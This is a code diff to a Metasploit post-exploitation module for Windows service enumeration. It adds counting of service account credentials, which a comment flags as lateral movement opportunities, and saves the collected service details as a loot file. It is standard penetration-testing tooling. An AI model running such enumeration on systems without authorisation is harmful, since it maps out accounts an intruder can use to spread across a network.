@@ -36,9 +36,13 @@ class Metasploit3 < Msf::Post
   end
 
 
+
   def run
 
     # set vars
+    lootString = ""
+    lootString.force_encoding(Encoding::UTF_8)
+    credentialCount = {}
     qcred = datastore["CRED"] || nil
     qpath = datastore["PATH"] || nil
     if datastore["TYPE"] == "All"
@@ -56,7 +60,12 @@ class Metasploit3 < Msf::Post
       print_status("Start Type Filter: " + qtype)
     end
 
-    print_status("Listing Service Info for matching services:")
+    if not datastore['VERBOSE']
+      print_status("Detailed output is only printed when VERBOSE is set to True. Running this module can take some time.\n")
+    else
+      print_status("Listing Service Info for matching services:")
+    end
+
     service_list.each do |sname|
       srv_conf = {}
       isgood = true
@@ -75,13 +84,29 @@ class Metasploit3 < Msf::Post
           if qtype and ! (srv_conf['Startup'] || '').downcase.include? qtype.downcase
             isgood = false
           end
+          #count the occurance of specific credentials services are running as
+          serviceCred = srv_conf['Credentials'].upcase
+          if not serviceCred == ''
+            if credentialCount.has_key?(serviceCred)
+              credentialCount[serviceCred] += 1
+            else
+              credentialCount[serviceCred] = 1
+              #let the user know a new service account has been detected for possible lateral movement opportunities
+              print_good("New service credential detected: #{sname} is running as '#{srv_conf['Credentials']}'\n")
+            end
+          end
 
           #if we are still good return the info
           if isgood
-            vprint_status("\tName: #{sname}")
-            vprint_good("\t\tStartup: #{srv_conf['Startup']}")
-            vprint_good("\t\tCommand: #{srv_conf['Command']}")
-            vprint_good("\t\tCredentials: #{srv_conf['Credentials']}")
+            msgString = "\tName: #{sname}"
+            msgString << "\n\t\tStartup: #{srv_conf['Startup']}"
+            #remove invalid char at the end
+            commandString = srv_conf['Command']
+            commandString.gsub!(/[\x00-\x08\x0b\x0c\x0e-\x19\x7f-\xff]+/n,"")
+            msgString << "\n\t\t#{commandString}"
+            msgString << "\n\t\tCredentials: #{srv_conf['Credentials']}\n"
+            vprint_good(msgString)
+            lootString << msgString
           end
         rescue
           print_error("An error occured enumerating service: #{sname}")
@@ -89,8 +114,10 @@ class Metasploit3 < Msf::Post
       else
         print_error("Problem enumerating services")
       end
-
     end
+      #store loot on completion of collection
+      p = store_loot("windows.services", "text/plain", session, lootString, "windows_services.txt", "Windows Services")
+      print_good("Loot file stored in: #{p.to_s}")
   end
 
 end
